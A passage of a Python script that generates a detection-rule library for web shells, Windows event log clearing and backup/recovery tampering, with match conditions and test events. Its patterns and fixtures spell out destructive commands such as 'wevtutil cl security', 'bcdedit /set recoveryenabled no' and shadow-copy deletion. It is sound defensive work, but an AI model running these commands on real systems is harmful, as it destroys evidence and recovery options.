 S("EXPLOIT-01","Web server spawns a shell or script host","Detect a web/app server process spawning cmd/powershell/sh — classic post-exploitation on a public app.","process","critical",
   ["w3wp","tomcat","child process","web shell"],[1,4688],SY,
   [ends("ParentImage",["\\w3wp.exe","\\httpd.exe","\\nginx.exe","\\java.exe","\\php-cgi.exe","\\tomcat*.exe"]),contains("Image",["cmd.exe","powershell","/bin/sh","/bin/bash","wscript","cscript"])],[],None,
   ["Some apps legitimately shell out (allowlist by path)"],
   ["Baseline each web app's child processes","Alert at high severity on servers in the DMZ"],
   [TEST("w3wp spawns cmd",{"EventID":1,"ParentImage":"...\\w3wp.exe","Image":"C:\\Windows\\System32\\cmd.exe"},"match")]),
 S("EXPLOIT-02","Web shell file written to web root","Detect creation of script files in a web content directory by the web server account.","process","high",
   ["web shell","web root","aspx","jsp","php"],[11],SY,
   [eq("EventID",11),contains("TargetFilename",["\\wwwroot\\","\\htdocs\\","\\webapps\\","/var/www/"]),ends("TargetFilename",[".aspx",".asp",".jsp",".jspx",".php",".ashx"])],[],None,
   ["Legitimate application deployments/updates"],
   ["Allowlist deployment pipelines","Alert when the writer is the web service account outside a deploy window"],
   [TEST("Script written to web root",{"EventID":11,"TargetFilename":"C:\\inetpub\\wwwroot\\x.aspx","Image":"...\\w3wp.exe"},"match")]),
 S("EXPLOIT-03","Spike in 5xx/4xx then anomalous request","Detect a burst of server errors to one path followed by a successful anomalous request — exploitation attempt.","multi_source","medium",
   ["web","5xx","exploit","anomaly"],[],["web_server"],
   [],[],AGG("sequence",["uri_path"],2,15,steps=["burst of 4xx/5xx to one path","200 to the same path with an unusual method/length"]),
   ["Noisy scanners generating many errors"],
   ["Pair with WAF telemetry where available"],
   [TEST("Errors then success",{"step1":{"status":500,"count":20,"uri":"/api/x"},"step2":{"status":200,"uri":"/api/x","unusual":True}},"match")])]}

KB["T1070.001"] = {"name":"Clear Windows Event Logs","scenarios":[
 S("LOGCLEAR-01","Security event log cleared","Detect 1102 (audit log cleared) or 104 (log cleared) events.","state_change","high",
   ["1102","104","log cleared","wevtutil"],[1102,104],WS,
   [eq("EventID",[1102,104])],[],None,
   ["Rare legitimate maintenance (require change ticket)"],
   ["Forward logs off-host so clearing does not destroy evidence","Alert at high severity and create an offense"],
   [TEST("Security log cleared",{"EventID":1102},"match")]),
 S("LOGCLEAR-02","Log clear via command line","Detect wevtutil cl / Clear-EventLog / Remove-EventLog in command telemetry.","process","high",
   ["wevtutil","clear-eventlog"],[1,4688],SY,
   [contains("CommandLine",["wevtutil cl","wevtutil clear-log","clear-eventlog","remove-eventlog"])],[],None,
   ["Build/imaging scripts that reset logs"],
   ["Allowlist imaging accounts/hosts"],
   [TEST("wevtutil cl security",{"EventID":1,"CommandLine":"wevtutil cl security"},"match")])]}

KB["T1490"] = {"name":"Inhibit System Recovery","scenarios":[
 S("RECOV-01","Backup or recovery tampering","Detect commands disabling recovery, deleting shadow copies, or wiping backup catalogs (also feeds ransomware detection).","process","critical",
   ["vssadmin","bcdedit","wbadmin","recovery"],[1,4688],SY,
   [contains("CommandLine",["delete shadows","delete catalog","recoveryenabled no","resize shadowstorage","wbadmin delete"])],[],None,
   ["Rare legitimate admin maintenance (require change ticket)"],
   ["Alert at critical severity","Correlate with mass file modification (RANSOM-01)"],
   [TEST("Recovery disabled",{"EventID":1,"CommandLine":"bcdedit /set recoveryenabled no"},"match")])]}

def main():
    out = {"framework":"SENTINEL MATRIX Detection Scenario Library","dataset_kind":"bundled","version":"1.0.0",
           "generated_at":datetime.datetime.now(datetime.timezone.utc).isoformat(),
           "kb":KB,
           "stats":{"techniques":len(KB),"scenarios":sum(len(v["scenarios"]) for v in KB.values())}}
    with open(os.path.join(HERE,"detection-scenario-templates.json"),"w") as f: json.dump(out,f,indent=1)
    print("scenarios:", out["stats"])

if __name__=="__main__": main()
